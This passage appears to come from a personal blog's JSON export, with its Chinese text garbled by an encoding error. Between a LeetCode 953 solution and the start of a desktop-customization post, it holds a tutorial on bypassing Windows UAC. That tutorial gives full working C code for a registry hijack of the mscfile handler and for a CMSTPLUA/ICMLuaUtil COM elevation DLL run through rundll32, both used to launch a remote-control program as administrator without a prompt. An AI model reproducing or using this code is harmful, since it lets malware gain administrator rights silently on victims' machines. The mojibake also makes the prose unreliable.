æ³•æ»¡è¶³ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰çš„æƒ…å†µï¼ˆå³ä¸¤ä¸ªå­—ç¬¦ä¸²æ¯ä¸ªå­—ç¬¦éƒ½ç›¸ç­‰ï¼ŒåŒ…æ‹¬æœ€åçš„\\0ç¬¦å·ä¹Ÿç›¸ç­‰ï¼Œäº§ç”Ÿäº†æº¢å‡ºï¼Œç†è®ºä¸Šå¾ªç¯å°†åœ¨å­—ç¬¦ä¸²åçš„æŸä¸ªä½ç½®ä¸Šåœæ­¢ã€‚\næ›´æ­£ï¼šå¾ªç¯ä¸­åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦çš„ç»ˆæ­¢ï¼Œæ”¹ä¸ºwhile (words1[idx] == words2[idx] \u0026amp;\u0026amp; words1[idx] != '\\0' \u0026amp;\u0026amp; words2[idx] != '\\0')ã€‚\nACä»£ç ï¼š\nclass Solution { public: int order_rank[26]; bool isAlienSorted(vector\u0026lt;string\u0026gt;\u0026amp; words, string order) { vector\u0026lt;string\u0026gt;::iterator ite; bool ret = true; set_rank(order); // è®¾ç½®order_rankæ•°ç»„ for (ite = words.begin(); ite != words.end(); ++ite) // ä¸¤ä¸¤å¯¹æ¯” { if (ite != words.end() - 1) { if (cmp(*ite, *(ite + 1)) \u0026gt; 0) // cmpè¿”å›æ­£æ•°ï¼Œå‰è€…æ¯”åè€…å¤§ { ret = false; break; } } } return ret; } void set_rank(string order) { int idx = 0; for (idx = 0; idx \u0026lt; 26; ++idx) { order_rank[order[idx] - \u0026#39;a\u0026#39;] = idx; // å¾—åˆ°æ¯ä¸ªå­—æ¯çš„é¡ºåºï¼Œrankè¶Šå°ï¼Œå‡ºç°è¶Šæ—©ï¼Œç­‰çº§è¶Šä½ } } int cmp(string words1, string words2) { int idx = 0; while (words1[idx] == words2[idx] \u0026amp;\u0026amp; words1[idx] != \u0026#39;\\0\u0026#39; \u0026amp;\u0026amp; words2[idx] != \u0026#39;\\0\u0026#39;) { ++idx; } // å¾ªç¯ç»“æŸï¼Œword1[idx] != words2[idx] // åˆ†ä¸‰ç§æƒ…å†µ if (words1[idx] == \u0026#39;\\0\u0026#39;) // words1åˆ°è¾¾æœ«å°¾ { if (words2[idx] == \u0026#39;\\0\u0026#39;) return 0; else return -1; // word1 \u0026lt; words2 } else if (words2[idx] == \u0026#39;\\0\u0026#39;) // words2 åˆ°è¾¾æœ«å°¾ { return 1; // word1 \u0026gt; words2 } else // å‡ºç°ä¸ç›¸ç­‰ï¼Œæ¯”è¾ƒä¸¤è€…å­—ç¬¦çš„rankï¼Œè¶Šä½çš„è¶Šå° return order_rank[words1[idx] - \u0026#39;a\u0026#39;] - order_rank[words2[idx] - \u0026#39;a\u0026#39;]; // words1[idx]çš„rankæ›´å°ï¼Œè¿”å›è´Ÿæ•° } }; ","date":"2021-01-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode953.-%E9%AA%8C%E8%AF%81%E5%A4%96%E6%98%9F%E8%AF%AD%E8%AF%8D%E5%85%B8/","title":"é”™é¢˜æœ¬ | LeetCode953. éªŒè¯å¤–æ˜Ÿè¯­è¯å…¸"},{"content":"æœ€è¿‘æ•´ç†ä»¥å‰çš„é¡¹ç›®ï¼Œå°è¯•åœ¨ä¸€ä¸ªç¨‹åºä¸Šå®ç°è¿›ç¨‹éšè—å’Œè‡ªåŠ¨ææƒï¼Œç»“æœè¿›ç¨‹éšè—èŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œæ²¡å¾—åˆ°ä¸€ä¸ªç†æƒ³çš„ç»“æœï¼Œè‡ªåŠ¨ææƒå€’æ˜¯å‚è€ƒäº†å‡ ä½å¤§ä½¬çš„æ–‡ç« åšå‡ºæ¥äº†ã€‚\nè¯ä¸å¤šè¯´ï¼Œæ€»ç»“æœ¬æ¬¡çš„ææƒåŠæ³•â€”â€”ç»•è¿‡UACã€‚\n1 UAC UACï¼ˆUserã€€Accountã€€Controlï¼‰æ˜¯Windowsç³»ç»Ÿä¸­çš„ä¸€é¡¹å®‰å…¨æœºåˆ¶ï¼Œå®ƒå¯ä»¥ä¿è¯åº”ç”¨ç¨‹åºä»¥éç®¡ç†å‘˜çš„æƒé™è¿è¡Œã€‚UACä½¿å¾—æ‰€æœ‰ç”¨æˆ·ä»¥æ ‡å‡†ç”¨æˆ·æƒé™ç™»å½•ï¼Œä»–ä»¬æ‰“å¼€çš„è¿›ç¨‹ï¼ˆç¨‹åºï¼‰ä¹Ÿå°†ä»¥æ ‡å‡†æƒé™è¿è¡Œï¼Œä¸€æ¬¾è‰¯å¥½çš„ç¨‹åºåº”è¯¥éµå®ˆè¿™ä¸€å®‰å…¨è§„åˆ™ã€‚\nç„¶è€Œï¼Œæœ‰äº›ç¨‹åºå¦‚å†å²é—ç•™çš„ç¨‹åºï¼Œåœ¨å½“å¹´è®¾è®¡é˜¶æ®µå¹¶æ²¡æœ‰å¾ˆå¥½åœ°è€ƒè™‘åˆ°å®‰å…¨é—®é¢˜ï¼Œå®ƒä»¬é€šå¸¸ä¼šè¯·æ±‚æ ‡å‡†æƒé™ä¹‹å¤–çš„æƒé™ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸å·¥ä½œï¼›æ­¤å¤–ï¼Œæœ‰äº›è¡Œä¸ºå¦‚ä¸‹è½½åº”ç”¨ã€ä¿®æ”¹é˜²ç«å¢™è®¾ç½®ç­‰éƒ½éœ€è¦æ ‡å‡†æƒé™ä»¥å¤–çš„æƒé™æ¥å®Œæˆã€‚\nå½“ä¸€æ¬¾åº”ç”¨éœ€è¦è¯·æ±‚æ ‡å‡†æƒé™ä»¥å¤–çš„æƒé™æ—¶ï¼ŒUACä¼šå°†æ­¤è¡Œä¸ºå‘ŠçŸ¥ç”¨æˆ·ï¼Œè¿™æ ·ä½¿å¾—ç”¨æˆ·å¯¹è‡ªå·±ç”µè„‘ä¸Šçš„ä»»ä½•ææƒè¡Œä¸ºäº†å¦‚æŒ‡æŒã€‚\nå¦‚æœä½ æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œä½ å¯ä»¥åœ¨ä»»æ„çš„ç¨‹åºä¸Šå³é”®ï¼Œé€‰æ‹©â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ï¼Œå°±èƒ½çœ‹åˆ°UACçš„å¼¹çª—ã€‚\nä¸éš¾ç†è§£ï¼Œé€šè¿‡è¿™æ ·çš„æ‰‹æ®µï¼Œå¯ä»¥æœ‰æ•ˆåœ°é˜»æ­¢æ¶æ„ç¨‹åºåœ¨ç”µè„‘ä¸Šçš„ç ´åè¡Œä¸ºï¼Œæˆ–è€…é˜²æ­¢ç”¨æˆ·å¯¹æŸäº›ç³»ç»Ÿè®¾ç½®çš„è¯¯æ›´æ”¹ã€‚\n2 ç»•è¿‡UAC æ ¹æ®å‚è€ƒæ–‡ç« ï¼»ï¼‘ï¼½æ‰€è¿°ï¼Œ\tè§¦å‘UACæ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªconsent.exeè¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹é€šè¿‡ç™½åå•ç¨‹åºå’Œç”¨æˆ·é€‰æ‹©æ¥åˆ¤æ–­æ˜¯å¦åˆ›å»ºç®¡ç†å‘˜æƒé™è¿›ç¨‹ã€‚è¯·æ±‚è¿›ç¨‹å°†è¦è¯·æ±‚çš„è¿›ç¨‹cmdlineå’Œè¿›ç¨‹è·¯å¾„é€šè¿‡LPCæ¥å£ä¼ é€’ç»™appinfo çš„ RAiLuanchAdminProcesså‡½æ•°ã€‚æµç¨‹å¦‚ä¸‹ï¼š\nè¯¥å‡½æ•°é¦–é€‰éªŒè¯è·¯å¾„æ˜¯å¦åœ¨ç™½åå•ä¸­ æ¥ç€å°†ç»“æœä¼ é€’ç»™consent.exeè¿›ç¨‹ è¯¥è¿›ç¨‹éªŒè¯è¯·æ±‚è¿›ç¨‹çš„ç­¾åä»¥åŠå‘èµ·è€…çš„æƒé™æ˜¯å¦ç¬¦åˆè¦æ±‚åï¼Œå†³å®šæ˜¯å¦å¼¹å‡ºUACçª—å£è®©ç”¨æˆ·ç¡®è®¤ UACçª—å£ä¼šåˆ›å»ºæ–°çš„å®‰å…¨æ¡Œé¢ï¼Œå±è”½ä¹‹å‰çš„ç•Œé¢ï¼ŒåŒæ—¶UACçª—å£è¿›ç¨‹æ˜¯ç³»ç»Ÿæƒé™è¿›ç¨‹ï¼Œå…¶ä»–æ™®é€šè¿›ç¨‹æ— æ³•å’Œå…¶è¿›è¡Œé€šä¿¡äº¤äº’ï¼Œç”¨æˆ·ç¡®è®¤åï¼Œè°ƒç”¨CreateProcessAsUserå‡½æ•°ä»¥ç®¡ç†å‘˜èº«ä»½å¯åŠ¨è¯·æ±‚çš„è¿›ç¨‹ã€‚ å¯¹äºä¸€äº›æ¶æ„ç¨‹åºè€Œè¨€ï¼Œæ€»æ˜¯å¸Œæœ›åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬ç»•è¿‡UACå¼¹çª—ã€‚ç›®å‰ç»•è¿‡UACæœ‰ä¸¤ç§æ€è·¯ï¼šåŸºäºç™½åå•å’ŒåŸºäºCOMç»„ä»¶æ¥å£ã€‚\n2.1 åŸºäºç™½åå•çš„Bypassã€€UAC æœ‰äº›ç³»ç»Ÿç¨‹åºå¯ä»¥ç›´æ¥è·å–ç®¡ç†å‘˜æƒé™ï¼Œè€Œä¸è§¦å‘UACå¼¹æ¡†ï¼Œè¿™ç±»ç¨‹åºç§°ä¸ºç™½åå•ç¨‹åºã€‚ä¾‹å¦‚ï¼šslui.exeã€wusa.exeã€taskmgr.exeã€msra.exeã€eudcedit.exeã€eventvwr.exeã€CompMgmtLauncher.exeç­‰ç­‰ã€‚\né’ˆå¯¹è¿™äº›ç¨‹åºï¼Œå¯ä»¥ä½¿ç”¨DLLæ³¨å…¥æˆ–ä¿®æ”¹æ³¨å†Œè¡¨æ‰§è¡Œå‘½ä»¤ç­‰æ–¹å¼å¯åŠ¨ç›®æ ‡ç¨‹åºï¼Œç”±äºå­è¿›ç¨‹é»˜è®¤ç»§æ‰¿çˆ¶è¿›ç¨‹çš„æƒé™ï¼Œè¢«è¿™äº›ç™½åå•ç¨‹åºæ‰€æ‰“å¼€çš„è¿›ç¨‹ä¹Ÿå°±å…·å¤‡ç®¡ç†å‘˜æƒé™äº†ã€‚\næˆ‘äº‹å…ˆå‡†å¤‡äº†ä¸€ä¸ªè¿œç¨‹æ§åˆ¶ç¨‹åºRemoteCtrl_Win10.exeï¼Œå¯ä»¥åŸºäºç™½åå•æœºåˆ¶ï¼Œåˆ©ç”¨å¦‚ä¸‹çš„ä»£ç å°è¯•å¯åŠ¨å®ƒï¼š\n#include \u0026lt;Windows.h\u0026gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // åˆ›å»ºé¡¹ ::RegCreateKeyEx(HKEY_CURRENT_USER, \u0026#34;Software\\\\Classes\\\\mscfile\\\\Shell\\\\Open\\\\Command\u0026#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, \u0026amp;hKey, NULL); // è®¾ç½®é”®å€¼ ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath))); // å…³é—­æ³¨å†Œè¡¨ ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // å…³é—­æ–‡ä»¶é‡å®šä½ ::Wow64DisableWow64FsRedirection(\u0026amp;OldValue); // ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œè®¾ç½®æˆ‘ä»¬çš„ç¨‹åºä¸ºå¯åŠ¨ç›®æ ‡ bRet = SetReg(\u0026#34;F:\\\\RemoteCtrl_Win10.exe\u0026#34;); // è¿è¡Œ CompMgmtLauncher.exe system(\u0026#34;CompMgmtLauncher.exe\u0026#34;); printf(\u0026#34;Run OK!\\n\u0026#34;); // æ¢å¤æ–‡ä»¶é‡å®šä½ ::Wow64RevertWow64FsRedirection(OldValue); return 0; } ç„¶è€Œï¼Œä¿®æ”¹æ³¨å†Œè¡¨çš„ææƒæ–¹å¼è¿‡äºç®€é™‹ï¼Œä¼šè¢«WinDefenderæ‹¦æˆªä¸‹æ¥ã€‚\nè¢«è¯†åˆ«çš„è¡Œä¸º è¿è¡Œçš„ç»“æœä¹Ÿå°±ä¸æ”¾äº†ã€‚ç¨‹åºä¼šç›´æ¥è¢«æ€æ­»ï¼ˆDefenderç”šè‡³æŠŠæˆ‘çš„ç›®æ ‡exeç»™åˆ äº†ï¼‰ã€‚\n2.2 åŸºäºCOMç»„ä»¶æ¥å£çš„Bypassã€€UAC æˆ‘å¯¹äºCOMçš„ç†è§£å®é™…ä¸Šä¸å¤Ÿæ¸…æ™°å’Œæ·±å…¥ï¼Œæœ‰å…´è¶£çš„å¯ä»¥å»çœ‹çœ‹å‚è€ƒæ–‡ç« [1~3]ã€‚\nä»æˆ‘çš„ç†è§£æ¥çœ‹ï¼ŒCOMï¼ˆComponent Object Modelï¼Œç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰æ˜¯ä¸€ç§æ›´åŠ ä¸¥æ ¼çš„é¢å‘å¯¹è±¡ç¼–ç¨‹è§„èŒƒï¼Œéµå®ˆè¿™ä¸€è§„èŒƒçš„äºŒè¿›åˆ¶ç¨‹åºéœ€è¦æä¾›æ ‡å‡†çš„æ¥å£æ¥ä¾›å…¶ä»–ç¨‹åºè°ƒç”¨ã€‚è¿™ç§ç¨‹åºä»¥â€œç»„ä»¶â€çš„æ–¹å¼å­˜åœ¨ï¼Œå¯ä»¥è¢«å¤ç”¨ï¼Œæ•…èŠ‚çœäº†å†…å­˜ï¼›è€Œä¸”ï¼Œç”±äºè¿™äº›ç»„ä»¶ç‹¬ç«‹å­˜åœ¨ï¼Œå¯¹å®ƒä»¬æœ¬èº«åšå‡ºçš„æ”¹åŠ¨ä¸ä¼šå½±å“ä½¿ç”¨è€…çš„ç¨‹åºç»“æ„ï¼Œæ–¹ä¾¿äº†å®ƒä»¬çš„åŠŸèƒ½å‡çº§ã€‚\nCOMæå‡åç§°ï¼ˆCOM Elevation Monikerï¼‰æŠ€æœ¯å…è®¸è¿è¡Œåœ¨ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰ä¸‹çš„åº”ç”¨ç¨‹åºï¼Œä»¥æå‡æƒé™çš„æ–¹æ³•æ¥æ¿€æ´»COMç±»ï¼Œæœ€ç»ˆæå‡COMæ¥å£æƒé™ã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¸»è°ƒç¨‹åºä»¥COMçš„è§„èŒƒå®ä¾‹åŒ–ä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç»„ä»¶ï¼Œè¿™æ ·è¿™ä¸ªç»„ä»¶çš„åŠŸèƒ½å‡½æ•°å°±èƒ½è¿è¡Œåœ¨ç®¡ç†å‘˜æƒé™ä¸‹ã€‚æ­¤å¤–ï¼ŒCOMè§„å®šäº†ä¸€ä¸ªICMLuaUtilæ¥å£ï¼Œå…¶ä¸‹æœ‰ä¸€ä¸ªShellExcuteæ–¹æ³•ï¼Œèƒ½å¤Ÿå¯åŠ¨ä»»æ„çš„ç¨‹åºã€‚\næ–‡ç« [1]è¿˜æŒ‡å‡ºï¼Œå¦‚æœæ‰§è¡ŒCOMæå‡åç§°ä»£ç çš„ç¨‹åºèº«ä»½æ˜¯ä¸å¯ä¿¡çš„ï¼Œåˆ™ä¼šè§¦å‘UACå¼¹çª—ï¼›è‹¥å¯ä¿¡ï¼Œåˆ™ä¸ä¼šè§¦å‘UACå¼¹çª—ã€‚æ‰€ä»¥ï¼Œè¦æƒ³Bypass UACï¼Œåˆ™éœ€è¦æƒ³åŠæ³•è®©è¿™æ®µä»£ç åœ¨Windowsçš„å¯ä¿¡ç¨‹åºä¸­è¿è¡Œã€‚å…¶ä¸­ï¼Œå¯ä¿¡ç¨‹åºæœ‰è®¡ç®—å™¨ã€è®°äº‹æœ¬ã€èµ„æºç®¡ç†å™¨ã€rundll32.exeç­‰ã€‚\næˆ‘ä»¬ä»…ä»…å¸Œæœ›ä»¥ç®¡ç†å‘˜æƒé™å¯åŠ¨æˆ‘ä»¬çš„è¿œæ§ç¨‹åºï¼Œåˆ™ç›´æ¥åˆ¶ä½œä¸€ä¸ªDLLäº¤ç»™rundll32.exeè¿è¡Œå³å¯ã€‚æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬çš„DLLåº”è¯¥å…ˆå®ä¾‹åŒ–ä¸€ä¸ªç®¡ç†å‘˜æƒé™çš„COMç»„ä»¶ï¼Œè¿™ä¸ªææƒåçš„ç»„ä»¶è°ƒç”¨ShellExcuteæ¥å¯åŠ¨è¿œæ§ç¨‹åºã€‚\nDLLé¡¹ç›®çš„ä»£ç å¦‚ä¸‹ï¼š\n// File: CBypassUAC.h #pragma once #ifndef BYPASS_UAC_H #define BYPASS_UAC_H #include \u0026#34;windows.h\u0026#34; #include \u0026lt;objbase.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #define CLSID_CMSTPLUA L\u0026#34;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\u0026#34; #define IID_ICMLuaUtil L\u0026#34;{6EDD6D74-C007-4E75-B76A-E5740995E24C}\u0026#34; typedef interface ICMLuaUtil ICMLuaUtil; typedef struct ICMLuaUtilVtbl { BEGIN_INTERFACE HRESULT(STDMETHODCALLTYPE* QueryInterface)( __RPC__in ICMLuaUtil* This, __RPC__in REFIID riid, _COM_Outptr_ void** ppvObject); ULONG(STDMETHODCALLTYPE* AddRef)( __RPC__in ICMLuaUtil* This); ULONG(STDMETHODCALLTYPE* Release)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method1)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method2)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method3)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method4)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method5)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method6)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* ShellExec)( __RPC__in ICMLuaUtil* This, _In_ LPCWSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow ); HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)( __RPC__in ICMLuaUtil* This, _In_ HKEY hKey, _In_opt_ LPCTSTR lpSubKey, _In_opt_ LPCTSTR lpValueName, _In_ LPCTSTR lpValueString ); HRESULT(STDMETHODCALLTYPE* Method9)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method10)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method11)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method12)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method13)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method14)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method15)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method16)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method17)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method18)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method19)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method20)( __RPC__in ICMLuaUtil* This); END_INTERFACE } *PICMLuaUtilVtbl; interface ICMLuaUtil { CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; }; extern \u0026#34;C\u0026#34; __declspec(dllexport) void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow); HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid); BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable); #endif // File: CBypassUAC.c #include \u0026#34;pch.h\u0026#34; #include \u0026#34;CBypassUAC.h\u0026#34; // COMæå‡åç§°ï¼Œä»¥ç®¡ç†å‘˜æƒé™å®ä¾‹åŒ–ä¸€ä¸ªç»„ä»¶ HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid) { BIND_OPTS3 bo; WCHAR wszCLSID[MAX_PATH] = { 0 }; WCHAR wszMonikerName[MAX_PATH] = { 0 }; HRESULT hr = 0; // åˆå§‹åŒ–COMç¯å¢ƒ ::CoInitialize(NULL); // æ„é€ å­—ç¬¦ä¸² ::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0]))); hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L\u0026#34;Elevation:Administrator!new:%s\u0026#34;, wszCLSID); if (FAILED(hr)) { return hr; } // è®¾ç½®BIND_OPTS3 ::RtlZeroMemory(\u0026amp;bo, sizeof(bo)); bo.cbStruct = sizeof(bo); bo.hwnd = hWnd; bo.dwClassContext = CLSCTX_LOCAL_SERVER; // åˆ›å»ºåç§°å¯¹è±¡å¹¶è·å–COMå¯¹è±¡ hr = ::CoGetObject(wszMonikerName, \u0026amp;bo, riid, ppVoid); return hr; } BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable) { HRESULT hr = 0; CLSID clsidICMLuaUtil = { 0 }; IID iidICMLuaUtil = { 0 }; ICMLuaUtil* CMLuaUtil = NULL; BOOL bRet = FALSE; do { ::CLSIDFromString(CLSID_CMSTPLUA, \u0026amp;clsidICMLuaUtil); ::IIDFromString(IID_ICMLuaUtil, \u0026amp;iidICMLuaUtil); // ææƒ hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(\u0026amp;CMLuaUtil)); if (FAILED(hr)) { break; } // å¯åŠ¨ç¨‹åº hr = CMLuaUtil-\u0026gt;lpVtbl-\u0026gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW); if (FAILED(hr)) { break; } bRet = TRUE; } while (FALSE); // é‡Šæ”¾ if (CMLuaUtil) { CMLuaUtil-\u0026gt;lpVtbl-\u0026gt;Release(CMLuaUtil); } return bRet; } void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow) { CMLuaUtilBypassUAC((LPWSTR)L\u0026#34;F:\\\\RemoteCtrl_Win10.exe\u0026#34;); } è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬è¦åœ¨å¤´æ–‡ä»¶ä¸­å°†ç›®æ ‡å‡½æ•°BypassUACå¯¼å‡ºï¼Œå¦åˆ™rundll32.exeç¨‹åºæ— æ³•æ­£ç¡®è·å–è¿™ä¸ªå‡½æ•°ã€‚å…·ä½“æ–¹æ³•å°±æ˜¯åœ¨å‡½æ•°å£°æ˜æ—¶åŠ ä¸Šextern \u0026quot;C\u0026quot; __declspec(dllexport)å‰ç¼€ã€‚\nå¯¹äºDLLé¡¹ç›®ä¸­çš„dllmain.cppæ–‡ä»¶ï¼Œä¿æŒé»˜è®¤å³å¯ã€‚ç¼–è¯‘æ­¤ç¨‹åºï¼Œç”Ÿæˆä¸€ä¸ªDLLã€‚ç°åœ¨æˆ‘ä»¬è¿˜éœ€è¦ç¼–å†™ä¸€ä¸ªç¨‹åºç”¨æ¥è°ƒç”¨rundll32.exeï¼Œä½¿å…¶æ‰§è¡Œé“¾æ¥åº“ä¸­çš„BypassUACå‡½æ•°ã€‚\næ–°å»ºä¸€ä¸ªLauncheré¡¹ç›®ï¼Œåªæœ‰ä¸€ä¸ªæºæ–‡ä»¶ï¼š\n// File: Launcher.cpp #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; int main() { //è°ƒç”¨rundll32.exeå»æ‰§è¡ŒRemoteThreadDll.dllçš„å¯¼å‡ºå‡½æ•° è¾¾åˆ°BypassUAC char szCmdLine[MAX_PATH] = { 0 }; char szRundll32Path[MAX_PATH] = \u0026#34;C:\\\\Windows\\\\System32\\\\rundll32.exe\u0026#34;; //è·å–å½“å‰ç¨‹åºæ‰€åœ¨è·¯å¾„ char pszFileName[MAX_PATH] = { 0 }; GetModuleFileNameA(NULL, pszFileName, MAX_PATH); //è·å–å½“å‰ç¨‹åºæ‰€åœ¨ç›®å½• (strrchr(pszFileName, \u0026#39;\\\\\u0026#39;))[0] = 0; //æ‹¼æ¥è¦æ³¨å…¥dllè·¯å¾„ char pszDllName[MAX_PATH] = { 0 }; sprintf_s(pszDllName, \u0026#34;%s\\\\%s\u0026#34;, pszFileName, \u0026#34;BypassUAC.dll\u0026#34;); sprintf_s(szCmdLine, \u0026#34;%s %s %s\u0026#34;, szRundll32Path, pszDllName, \u0026#34;BypassUAC\u0026#34;); WinExec(szCmdLine, SW_HIDE); } è¿è¡Œæ­¤Launcherï¼Œå°†ä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€æˆ‘ä»¬çš„è¿œæ§ç¨‹åºã€‚\nç®¡ç†å‘˜æƒé™æ‰§è¡Œç”¨æˆ·æ·»åŠ  è€Œæ²¡æœ‰ææƒæ—¶æˆ‘ä»¬çš„ç¨‹åºæ— æ³•æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤ã€‚\næ­£å¸¸æƒé™ä¸‹è¢«æ‹’ç»è®¿é—® å‚è€ƒæ–‡ç«  [1] é…·æ‰¯å„¿.Windowsç¼–ç¨‹æŠ€æœ¯ï¼šææƒæŠ€æœ¯(ä¸‹)[EB/OL].2020-09-22\nhttps://baijiahao.baidu.com/s?id=1678518589760092233\u0026wfr=spider\u0026for=pc\n[2] FDCFDMin.COMï¼ˆComponet Object Model_ç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰æŠ€æœ¯æ¦‚è¿°[EB/OL].2018-09-17\nhttps://blog.csdn.net/weixin_39743893/article/details/82500563\n[3] Microsoft.COM Technical Overview[EB/OL].2018-05-31\nhttps://docs.microsoft.com/zh-cn/windows/win32/com/com-technical-overview\n[4] è‡ªå·±çš„å°ç™½.åŸºäºCOMç»„ä»¶æ¥å£ICMLuaUtilçš„Bypass UAC[EB/OL].2020-04-24\nhttps://www.cnblogs.com/ndyxb/p/12770289.html\næœ¬æ–‡ä¸­ä½¿ç”¨çš„è¿œæ§ç¨‹åº https://github.com/SGS4ever/RemoteCtrl\n","date":"2020-12-28T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/","title":"ææƒæŠ€æœ¯--ç»•è¿‡UAC"},{"content":"è°èƒ½æƒ³åˆ°æˆ‘åœ¨è€ƒè¯•å‰ä¸€å¤©è¿˜åœ¨å†™æ¡Œé¢ç¾åŒ–çš„åšå®¢å‘¢ï¼Ÿ\nç”µè„‘æ¡Œé¢æ˜¯æ¯å¤©å¼€æœºåè¿›å…¥å·¥ä½œä¹‹å‰ç¬¬ä¸€çœ¼çœ‹åˆ°çš„ä¸œè¥¿ï¼Œä¸€ä¸ªç¾è§‚çš„æ¡Œé¢èƒ½ä»å¿ƒæƒ…ä¸Šç»™äººä»¥æŒ¯å¥‹ã€‚æˆ‘åœ¨æ•´æœºé‡è£…ä¹‹åå­¦ä¹ äº†ä¸€ä¸‹å¦‚ä½•ç¾åŒ–æ¡Œé¢ï¼Œç°åœ¨æˆ‘çš„Window10ç³»ç»Ÿæ¡Œé¢é•¿æˆè¿™æ ·ï¼š\næ¡Œé¢æ•ˆæœ 1. rainmeter rainmeterå®é™…ä¸Šæ˜¯ä¸€ä¸ªç³»ç»ŸçŠ¶æ€ç›‘è§†è½¯ä»¶ï¼Œç”±äºå…¶å¼ºå¤§çš„å¯å®šåˆ¶æ€§åŠæ‰©å±•æ€§ï¼Œè¯¸å¤šä½¿ç”¨è€…åœ¨åŸæ¥çš„åŸºç¡€ä¸Šå¼€å‘äº†æˆç™¾ä¸Šåƒçš„æ’ä»¶ç¨‹åºå’Œçš®è‚¤æ ·å¼ï¼Œä½¿å¾—ç°åœ¨çš„rainmeterå‡ ä¹æˆä¸ºä¸€æ¬¾å®Œç¾çš„ç³»ç»Ÿç¾åŒ–å·¥å…·ã€‚ä½ å¯ä»¥ä»å®˜ç½‘ä¸Šä¸‹è½½å®ƒï¼š\nRainmeter, desktop customization tool\nä¸‹è½½å®‰è£…å®Œæˆä¹‹åï¼Œæ‰“å¼€è¿™ä¸ªç¨‹åºï¼Œè‡ªå¸¦ä¸€ä¸ªç®€å•çš„æ ·å¼ï¼Œä½¿å¾—ä½ å¯ä»¥åœ¨æ¡Œé¢ä¸Šçœ‹åˆ°CPUä½¿ç”¨ç‡ã€ç£ç›˜ä½¿ç”¨æƒ…å†µç­‰ç­‰ã€‚\nè¦è¾¾åˆ°ç¾åŒ–çš„æ•ˆæœï¼Œä»…ä»…ä½¿ç”¨è‡ªå¸¦çš„ç»„ä»¶æ 